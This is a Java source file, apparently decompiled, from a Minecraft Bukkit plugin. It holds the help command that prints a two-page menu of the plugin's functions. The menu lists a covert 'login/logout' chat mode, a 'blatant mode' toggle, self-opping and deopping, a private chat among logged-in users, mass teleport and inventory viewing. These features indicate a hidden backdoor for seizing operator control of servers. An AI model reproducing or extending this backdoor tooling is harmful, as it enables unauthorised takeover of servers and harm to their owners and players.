
package me.system.runner.command.impl.help;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import me.system.runner.methods.Tips;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class HelpCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        int maxPages = 2;
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("help <1-" + maxPages + ">"));
        } else if (args[1].equalsIgnoreCase("1")) {
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            p2.sendMessage("         " + Settings.DARK_RED + Settings.NAME + " by " + Settings.AUTHOR);
            p2.sendMessage("");
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7logout &8l &fLogs out so you can speak again!"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7blatant &8l &fTurns blatant mode on or off"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&7status &8l &fGives you server and " + Settings.NAME + " info")));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&7adminhelp &8l &fLists " + Settings.NAME + " admin commands!")));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7sc &8l &fTalk to all players logged in on the server"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7chat &8l &fSend a chat without having to log out"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7op &8l &fOp yourself or another player!"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7deop &8l &fDeops you or another player!"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7plugins &8l &fLists the server plugins"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7msg &8l &fMessages another player"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7reply &8l &fReplys to the person who messaged you last"));
            p2.sendMessage("");
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&8(" + Settings.DARK_RED + "Tip&8) l &7" + Tips.getTip())));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else if (args[1].equalsIgnoreCase("2")) {
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            p2.sendMessage("         " + Settings.DARK_RED + Settings.NAME + " by " + Settings.AUTHOR);
            p2.sendMessage("");
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7tp &8l &fTeleports you to another player"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7tpall &8l &fTeleports all players to you or another player"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7invsee &8l &fOpens another players inventory"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7tip &8l &fGIVES TIP!"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&7sc &8l &fServer Chat!")));
            p2.sendMessage("");
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&8(" + Settings.DARK_RED + "Tip&8) l &7" + Tips.getTip())));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else {
            p2.sendMessage(Settings.PREFIX("That page does not exist. Use pages 1-" + maxPages));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

